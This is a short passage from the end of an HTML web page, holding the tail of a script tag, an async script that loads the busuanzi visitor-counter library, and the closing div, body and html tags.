data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>